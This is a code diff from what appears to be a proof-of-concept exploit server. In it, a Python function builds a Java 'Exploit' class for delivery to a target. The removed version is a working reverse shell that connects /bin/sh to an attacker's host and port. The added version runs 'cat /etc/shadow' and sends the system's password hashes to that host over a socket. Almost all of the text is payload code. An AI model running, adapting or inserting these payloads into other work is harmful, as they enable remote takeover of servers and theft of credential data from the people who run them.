@@ -10,48 +10,37 @@ from http.server import HTTPServer, SimpleHTTPRequestHandler
 
 CUR_FOLDER = Path(__file__).parent.resolve()
 
-
 def generate_payload(userip: str, lport: int) -> None:
     program = """
-import java.io.IOException;
-import java.io.InputStream;
 import java.io.OutputStream;
+import java.io.OutputStreamWriter;
+import java.io.BufferedWriter;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
 import java.net.Socket;
 
 public class Exploit {
-
     public Exploit() throws Exception {
         String host="%s";
         int port=%d;
-        String cmd="/bin/sh";
-        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+        String cmd="cat /etc/shadow";
+		Process process = Runtime.getRuntime().exec(cmd);
+        StringBuilder output = new StringBuilder();
+        BufferedReader reader = new BufferedReader(
+                new InputStreamReader(process.getInputStream()));
+        String line;
+        while ((line = reader.readLine()) != null) {
+            output.append(line);
+        }
         Socket s=new Socket(host,port);
-        InputStream pi=p.getInputStream(),
-            pe=p.getErrorStream(),
-            si=s.getInputStream();
-        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
-        while(!s.isClosed()) {
-            while(pi.available()>0)
-                so.write(pi.read());
-            while(pe.available()>0)
-                so.write(pe.read());
-            while(si.available()>0)
-                po.write(si.read());
-            so.flush();
-            po.flush();
-            Thread.sleep(50);
-            try {
-                p.exitValue();
-                break;
-            }
-            catch (Exception e){
-            }
-        };
-        p.destroy();
+        OutputStream so=s.getOutputStream();
+        BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(so));
+        bw.write(output.toString());
+        bw.flush();
         s.close();
     }
 }
-""" % (userip, lport)
+""" %(userip, lport)
 
     # writing the exploit to Exploit.java file
 
